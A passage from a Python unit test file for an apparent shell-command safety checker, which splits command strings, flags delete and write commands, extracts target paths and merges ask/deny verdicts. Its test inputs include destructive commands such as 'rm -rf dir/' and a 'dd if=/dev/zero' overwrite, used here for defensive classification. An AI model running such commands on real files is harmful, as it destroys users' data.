        result = split_commands("echo $(echo $(date))")
        self.assertEqual(result, ["echo $(echo $(date))"])

    def test_split_empty_string(self):
        result = split_commands("")
        self.assertEqual(result, [])

    def test_split_only_whitespace(self):
        result = split_commands("   ")
        self.assertEqual(result, [])

    def test_split_only_separators(self):
        result = split_commands(";;;")
        self.assertEqual(result, [])

    def test_delete_rm_with_flags(self):
        """rm with various flag combinations."""
        self.assertTrue(is_delete_command("rm -f file"))
        self.assertTrue(is_delete_command("rm -rf dir/"))
        self.assertTrue(is_delete_command("rm --force file"))

    def test_write_dd_of(self):
        """dd with of= is a write."""
        self.assertTrue(is_write_command("dd if=/dev/zero of=file bs=1M"))

    def test_path_extraction_dd_of(self):
        """dd of= syntax should extract path."""
        with tempfile.TemporaryDirectory() as tmpdir:
            f = Path(tmpdir) / "output"
            f.touch()
            paths = extract_paths(
                "dd if=/dev/zero of=output", Path(tmpdir)
            )
            names = [p.name for p in paths]
            self.assertIn("output", names)

    def test_redirect_with_fd(self):
        """2> errors.log should extract the target."""
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = extract_redirection_targets(
                "cmd 2> errors.log", Path(tmpdir)
            )
            names = [t.name for t in targets]
            self.assertIn("errors.log", names)

    def test_verdict_same_priority_keeps_current(self):
        """Two ask verdicts: current is kept."""
        result = _stronger_verdict(("ask", "reason1"), ("ask", "reason2"))
        self.assertEqual(result, ("ask", "reason1"))

    def test_verdict_two_denies_keeps_current(self):
        """Two deny verdicts: current is kept."""
        result = _stronger_verdict(("deny", "r1"), ("deny", "r2"))
        self.assertEqual(result, ("deny", "r1"))


# ============================================================
# Runner
# ============================================================


if __name__ == "__main__":
    # Support both pytest and direct execution
    unittest.main(verbosity=2)
